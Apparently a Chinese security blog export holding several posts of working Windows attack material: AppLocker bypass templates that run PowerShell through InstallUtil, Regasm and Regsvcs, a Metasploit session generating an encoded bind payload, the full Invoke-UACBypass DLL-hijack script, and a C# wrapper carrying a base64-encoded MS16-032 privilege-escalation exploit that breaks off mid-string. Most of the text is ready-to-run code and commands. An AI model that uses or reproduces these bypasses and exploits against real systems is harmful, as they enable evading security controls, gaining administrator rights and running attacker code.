扫描可执行路径： 绕过AppLocker执行： 0x02 禁用powershell以后 配置禁用powershell 禁用以后再次打开powershell 1、通过.Net执行powershell通过.Net执行powershell进行绕过： C# templaepowershell.cs123456789101112131415using System;using System.Management.Automation;namespace Powershell&#123; class Program &#123; static void Main(string[] args) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125;&#125; 编译exe以后不能直接运行，可以放到可执行目录执行,调用powershell。 2、InstallUtil 参考1：http://drops.wooyun.org/tips/8862 参考2: http://drops.wooyun.org/tips/8701 InstallUtil.cs123456789101112131415161718192021222324using System;using System.Management.Automation;namespace Whitelist&#123; class Program &#123; static void Main(string[] args) &#123; &#125; &#125;&#125;[System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer &#123; //The Methods can be Uninstall/Install. Install is transactional, and really unnecessary. public override void Uninstall(System.Collections.IDictionary savedState) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125; 编译以后用/U参数运行：12C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:InstallUtil.exe InstallUtil.csC:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U InstallUtil.exe 3、Regasm &amp; Regsvcs Regasm.cs12345678910111213141516171819202122using System;using System.EnterpriseServices;using System.Runtime.InteropServices;using System.Management.Automation;namespace regsvcser&#123; public class Bypass : ServicedComponent &#123; public Bypass() &#123; Console.WriteLine("I am a basic COM Object"); &#125; [ComUnregisterFunction] //This executes if registration fails public static void UnRegisterClass ( string key ) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125;&#125; 使用方式为：12345678910111213141516Create Your Strong Name Key -&gt; key.snk$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='$Content = [System.Convert]::FromBase64String($key)Set-Content key.snk -Value $Content -Encoding ByteC:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:Regasm.dll /keyfile:key.snk Regasm.csC:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Regasm.dll [OR]C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Regasm.dll //Executes UnRegisterClass If you don't have permissionsC:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U Regasm.dll C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Regasm.dll //This calls the UnregisterClass Method 4、nishang 文件backdoor虽然powershell被禁用了，但是仍然可执行shellcode。可以使用hta,macro等方式进行。 0x03 提权提权到管理员权限，即可执行突破AppLocker的限制，执行exe和脚本]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>applocker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shellter Custom payload]]></title>
    <url>%2Farchives%2FShellter_Custom_payload.html</url>
    <content type="text"><![CDATA[12345678910111213141516msf &gt; show payloadsmsf &gt; use windows/meterpreter/bind_hidden_ipknock_tcpmsf payload(bind_hidden_ipknock_tcp) &gt; show options Module options (payload/windows/meterpreter/bind_hidden_ipknock_tcp):Name Current Setting Required Description---- --------------- -------- -----------EXITFUNC process yes Exit technique (Accepted: , , seh, thread, process, none)KHOST yes IP address allowedLPORT 4444 yes The listen portRHOST no The target addressmsf payload(bind_hidden_ipknock_tcp) &gt; set EXITFUNC threadmsf payload(bind_hidden_ipknock_tcp) &gt; set KHOST 8.8.8.8msf payload(bind_hidden_ipknock_tcp) &gt; set LPORT 5555msf payload(bind_hidden_ipknock_tcp) &gt; generate -E -e x86/shikata_ga_nai -t raw -f custom_payload[*] Writing 386 bytes to custom_payload...]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BypassUac On Win10 Using Disk Cleanup]]></title>
    <url>%2Farchives%2FBypassUAC_on_Win10_Using_Disk_Cleanup.html</url>
    <content type="text"><![CDATA[最近看到enigma0x3博客上分享了一种通过Disk Cleanup计划任务进行bypassuac的姿势，感觉还是不错的，所以在这儿分享一下。原文在这里 戳我关于BypassUAC工具已经很多了，有个非常不错的工具 UACME 简单的说一下通过Disk Cleanup进行bypassuac的原理。 Win10有一个计划任务叫做SilentCleanup,具体位置在\Microsoft\Windows\DiskCleanup 这个计划任务是会使用最高权限运行程序的，而加载此计划任务不需要最高权限。 此任务执行会运行cleanmgr.exe，而且会创建一个新的文件夹“C:\Users\&lt;username&gt;\AppData\Local\Temp\&lt;GUID&gt;”并将dismhost.exe以及其使用的相关DLL文件复制到这个文件夹下面。 当dismhost.exe运行时，会加载其要使用的DLL文件，由于当前目录是在%TEMP%，所以完全可以进行DLL劫持，测试发现LogProvider.dll是最后一个加载的DLL，可以被我们利用，所以只需要把这个DLL替换成我们的恶意DLL，那么这个计划任务运行的时候，我们的DLL就会被加载，达到BypassUAC的目的。为了能马上进行BypassUAC，可以使用WMI来运行这个计划任务。作者已经给出了利用脚本，链接 BypassUAC , 测试DLL链接：MessageBox。 有兴趣的测测看吧~ 作者代码被墙了，贴在了下面:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899function Invoke-UACBypass &#123;&lt;#.SYNOPSISBypasses UAC on Windows 10 by abusing the SilentCleanup task to win a race condition, allowing for a DLL hijack without a privileged file copy.Author: Matthew Graeber (@mattifestation), Matt Nelson (@enigma0x3)License: BSD 3-ClauseRequired Dependencies: NoneOptional Dependencies: None.PARAMETER DllPathSpecifies the path to the DLL you want executed in a high integrity context. Be mindful of the architecture of the DLL. It must match that of %SystemRoot%\System32\Dism\LogProvider.dll..EXAMPLEInvoke-UACBypass -DllPath C:\Users\TestUser\Desktop\Win10UACBypass\PrivescTest.dll.EXAMPLEInvoke-UACBypass -DllPath C:\Users\TestUser\Desktop\TotallyLegit.txt -VerboseThe DllPath can have any extension as long as the file itself is a DLL.#&gt; [CmdletBinding()] [OutputType([System.IO.FileInfo])] Param ( [Parameter(Mandatory = $True)] [String] [ValidateScript(&#123; Test-Path $_ &#125;)] $DllPath ) $PrivescAction = &#123; $ReplacementDllPath = $Event.MessageData.DllPath # The newly created GUID folder $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name $OriginalPreference = $VerbosePreference # Force -Verbose to display in the event if ($Event.MessageData.VerboseSet -eq $True) &#123; $VerbosePreference = 'Continue' &#125; Write-Verbose "DismHost folder created in $DismHostFolder" Write-Verbose "$ReplacementDllPath to $DismHostFolder\LogProvider.dll" try &#123; $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination "$DismHostFolder\LogProvider.dll" -Force -PassThru -ErrorAction Stop &#125; catch &#123; Write-Warning "Error copying file! Message: $_" &#125; # Restore the event preference $VerbosePreference = $OriginalPreference if ($FileInfo) &#123; # Trigger Wait-Event to return and indicate success. New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo &#125; &#125; $VerboseSet = $False if ($PSBoundParameters['Verbose']) &#123; $VerboseSet = $True &#125; $MessageData = New-Object -TypeName PSObject -Property @&#123; DllPath = $DllPath VerboseSet = $VerboseSet # Pass the verbose preference to the scriptblock since # event scriptblocks will not automatically honor -Verbose. &#125; $TempDrive = $Env:TEMP.Substring(0,2) # Trigger the DLL dropper with the following conditions: # 1) A directory is created - i.e. new Win32_Directory instance # 2) The directory created is created under %TEMP% # 3) The directory name is in the form of a GUID $TempFolderCreationEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"$TempDrive`" AND TargetInstance.Path = `"$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`"" $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData # We need to jump through these hoops to properly capture stdout and stderr of schtasks. $StartInfo = New-Object Diagnostics.ProcessStartInfo $StartInfo.FileName = 'schtasks' $StartInfo.Arguments = '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I' $StartInfo.RedirectStandardError = $True $StartInfo.RedirectStandardOutput = $True $StartInfo.UseShellExecute = $False $Process = New-Object Diagnostics.Process $Process.StartInfo = $StartInfo $null = $Process.Start() $Process.WaitForExit() $Stdout = $Process.StandardOutput.ReadToEnd().Trim() $Stderr = $Process.StandardError.ReadToEnd().Trim() if ($Stderr) &#123; Unregister-Event -SubscriptionId $TempFolderWatcher.Id throw "SilentCleanup task failed to execute. Error message: $Stderr" &#125; else &#123; if ($Stdout.Contains('is currently running')) &#123; Unregister-Event -SubscriptionId $TempFolderWatcher.Id Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.' &#125; Write-Verbose "SilentCleanup task executed successfully. Message: $Stdout" &#125; $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10 Unregister-Event -SubscriptionId $TempFolderWatcher.Id if ($PayloadExecutedEvent) &#123; Write-Verbose 'UAC bypass was successful!' # Output the file info for the DLL that was planted $PayloadExecutedEvent.MessageData $PayloadExecutedEvent | Remove-Event &#125; else &#123; # The event timed out. Write-Error 'UAC bypass failed. The DLL was not planted in its target.' &#125;&#125;]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编译你的Powershell( MS16-032为例)]]></title>
    <url>%2Farchives%2FCompile_Your_Powreshell_Script.html</url>
    <content type="text"><![CDATA[授人以鱼不如授人以渔 之前的MS16-032是个powershell脚本，怎么样改成exe呢，很简单。使用.net直接简单的修改编译就可以了。已经改好的代码在这里： 戳我 gist貌似被墙了，我在这里也贴一下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*Author: Evilcg, Twitter: @EvilcgStep One:PS C:\&gt; [psobject].Assembly.LocationC:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dllStep Two:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:MS16_032.exe MS16_032.cs*/// Windows 10 reference may be Here: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35using System;using System.IO;using System.Collections.Generic;using System.Collections.ObjectModel;using System.Text;using System.Threading.Tasks;using System.Management.Automation;using System.Management.Automation.Host;using System.Management.Automation.Runspaces;namespace ConsoleApplication1&#123; class Program &#123; static string _application; static string _commandline; static int Main(string[] args) &#123; if (args.Length == 0) &#123; System.Console.WriteLine("Usage: MS16_032.exe calc.exe OR MS16_032.exe cmd.exe \"/c clac.exe\""); return 1; &#125; else if (args.Length ==1) &#123; _application = args[0]; PowerShellExecutor t = new PowerShellExecutor(); t.ExecuteSynchronously(_application, ""); &#125; else if(args.Length == 2) &#123; _application = args[0]; _commandline = args[1]; PowerShellExecutor t = new PowerShellExecutor(); t.ExecuteSynchronously(_application, _commandline); &#125; return 0; &#125; &#125; class PowerShellExecutor &#123; public static string PSInvoke_MS16_032 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLU1TMTYtMDMyIHsKPCMKLlNZTk9QU0lTCiAgICAKICAgIFBvd2VyU2hlbGwgaW1wbGVtZW50YXRpb24gb2YgTVMxNi0wMzIuIFRoZSBleHBsb2l0IHRhcmdldHMgYWxsIHZ1bG5lcmFibGUKICAgIG9wZXJhdGluZyBzeXN0ZW1zIHRoYXQgc3VwcG9ydCBQb3dlclNoZWxsIHYyKy4gQ3JlZGl0IGZvciB0aGUgZGlzY292ZXJ5IG9mCiAgICB0aGUgYnVnIGFuZCB0aGUgbG9naWMgdG8gZXhwbG9pdCBpdCBnbyB0byBKYW1lcyBGb3JzaGF3IChAdGlyYW5pZGRvKS4KICAgIAogICAgVGFyZ2V0czoKICAgIAogICAgKiBXaW43LVdpbjEwICYgMms4LTJrMTIgPD09IDMyLzY0IGJpdCEKICAgICogVGVzdGVkIG9uIHgzMiBXaW43LCB4NjQgV2luOCwgeDY0IDJrMTJSMgogICAgCiAgICBOb3RlczoKICAgIAogICAgKiBJbiBvcmRlciBmb3IgdGhlIHJhY2UgY29uZGl0aW9uIHRvIHN1Y2NlZWQgdGhlIG1hY2hpbmUgbXVzdCBoYXZlIDIrIENQVQogICAgICBjb3Jlcy4gSWYgdGVzdGluZyBpbiBhIFZNIGp1c3QgbWFrZSBzdXJlIHRvIGFkZCBhIGNvcmUgaWYgbmVlZGVkIG1rYXkuCiAgICAqIFRoZSBleHBsb2l0IGlzIHByZXR0eSByZWxpYWJsZSwgaG93ZXZlciB+MS82IHRpbWVzIGl0IHdpbGwgc2F5IGl0IHN1Y2NlZWRlZAogICAgICBidXQgbm90IHNwYXduIGEgc2hlbGwuIE5vdCBzdXJlIHdoYXQgdGhlIGlzc3VlIGlzIGJ1dCBqdXN0IHJlLXJ1biBhbmQgcHJvZml0IQogICAgKiBXYW50IHRvIGtub3cgbW9yZSBhYm91dCBNUzE2LTAzMiA9PT4KICAgICAgaHR0cHM6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jby51ay8yMDE2LzAzL2V4cGxvaXRpbmctbGVha2VkLXRocmVhZC1oYW5kbGUuaHRtbAoKLkRFU0NSSVBUSU9OCiAgICBBdXRob3I6IFJ1YmVuIEJvb25lbiAoQEZ1enp5U2VjKQogICAgQmxvZzogaHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS8KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQb3dlclNoZWxsIHYyKwogICAgT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCgouUEFSQU1FVEVSIEFwcGxpY2F0aW9uCgpTcGVjaWZpZXMgYW4gQXBwbGljYXRpb24gdG8gcnVuLgoKLlBBUkFNRVRFUiBDb21tYW5kbGluZQoKU3BlY2lmaWVzIENvbW1hbmRsaW5lLCBzdWNoIGFzIG5ldCB1c2VyIHh4eCB4eHggL2FkZAogICAgCi5FWEFNUExFCiAgICBDOlxQUz4gSW52b2tlLU1TMTYtMDMyIC1BcHBsaWNhdGlvbiBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUKICAgIEM6XFBTPiBJbnZva2UtTVMxNi0wMzIgLUFwcGxpY2F0aW9uIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSAtQ29tbWFuZGxpbmUgIi9jIG5ldCB1c2VyIDEgMSAvYWRkIgoKIz4KICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWUgPSAnQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlJyApXQogICAgICAgIFtzdHJpbmddCiAgICAgICAgJEFwcGxpY2F0aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkQ29tbWFuZGxpbmUKICAgICAgICApCgoKICAgIEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIgogICAgdXNpbmcgU3lzdGVtOwogICAgdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogICAgdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CiAgICAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSldCiAgICBwdWJsaWMgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIEludDMyIGR3RmxhZ3M7CiAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTUU9TCiAgICB7CiAgICAgICAgcHVibGljIGludCBMZW5ndGg7CiAgICAgICAgcHVibGljIGludCBJbXBlcnNvbmF0aW9uTGV2ZWw7CiAgICAgICAgcHVibGljIGludCBDb250ZXh0VHJhY2tpbmdNb2RlOwogICAgICAgIHB1YmxpYyBib29sIEVmZmVjdGl2ZU9ubHk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgQWR2YXBpMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCiAgICAgICAgICAgIFN0cmluZyB1c2VyTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGRvbWFpbiwKICAgICAgICAgICAgU3RyaW5nIHBhc3N3b3JkLAogICAgICAgICAgICBpbnQgbG9nb25GbGFncywKICAgICAgICAgICAgU3RyaW5nIGFwcGxpY2F0aW9uTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGNvbW1hbmRMaW5lLAogICAgICAgICAgICBpbnQgY3JlYXRpb25GbGFncywKICAgICAgICAgICAgaW50IGVudmlyb25tZW50LAogICAgICAgICAgICBTdHJpbmcgY3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgcmVmICBTVEFSVFVQSU5GTyBzdGFydHVwSW5mbywKICAgICAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm9ybWF0aW9uKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0VGhyZWFkVG9rZW4oCiAgICAgICAgICAgIHJlZiBJbnRQdHIgVGhyZWFkLAogICAgICAgICAgICBJbnRQdHIgVG9rZW4pOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuVGhyZWFkVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICBib29sIE9wZW5Bc1NlbGYsCiAgICAgICAgICAgIG91dCBJbnRQdHIgVG9rZW5IYW5kbGUpOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuUHJvY2Vzc1Rva2VuKAogICAgICAgICAgICBJbnRQdHIgUHJvY2Vzc0hhbmRsZSwgCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICByZWYgSW50UHRyIFRva2VuSGFuZGxlKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBleHRlcm4gc3RhdGljIGJvb2wgRHVwbGljYXRlVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLAogICAgICAgICAgICBpbnQgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwKICAgICAgICAgICAgcmVmIEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgS2VybmVsMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldExhc3RFcnJvcigpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50VGhyZWFkKCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRUaHJlYWRJZChJbnRQdHIgaFRocmVhZCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldFByb2Nlc3NJZE9mVGhyZWFkKEludFB0ciBoYW5kbGUpOwogICAgICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTdXNwZW5kVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKAogICAgICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgICAgIHVpbnQgdUV4aXRDb2RlKTsKICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ciBoT2JqZWN0KTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoCiAgICAgICAgICAgIEludFB0ciBoU291cmNlUHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgSW50UHRyIGhTb3VyY2VIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBoVGFyZ2V0UHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgcmVmIEludFB0ciBscFRhcmdldEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3RGVzaXJlZEFjY2VzcywKICAgICAgICAgICAgYm9vbCBiSW5oZXJpdEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3T3B0aW9ucyk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgTnRkbGwKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE50SW1wZXJzb25hdGVUaHJlYWQoCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRUb0ltcGVyc29uYXRlLAogICAgICAgICAgICByZWYgU1FPUyBTZWN1cml0eVF1YWxpdHlPZlNlcnZpY2UpOwogICAgfQoiQAoKICAgIGZ1bmN0aW9uIEdldC1UaHJlYWRIYW5kbGUgewogICAgICAgICMgU3RhcnR1cEluZm8gU3RydWN0CiAgICAgICAgJFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRJbnB1dCA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5oU3RkT3V0cHV0ID0gW0tlcm5lbDMyXTo6R2V0Q3VycmVudFRocmVhZCgpCiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRFcnJvciA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5jYiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU3RhcnR1cEluZm8pICMgU3RydWN0IFNpemUKICAgICAgICAKICAgICAgICAjIFByb2Nlc3NJbmZvIFN0cnVjdAogICAgICAgICRQcm9jZXNzSW5mbyA9IE5ldy1PYmplY3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgICAgIAogICAgICAgICMgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcgLS0+IGxwQ3VycmVudERpcmVjdG9yeQogICAgICAgICRHZXRDdXJyZW50UGF0aCA9IChHZXQtSXRlbSAtUGF0aCAiLlwiIC1WZXJib3NlKS5GdWxsTmFtZQogICAgICAgI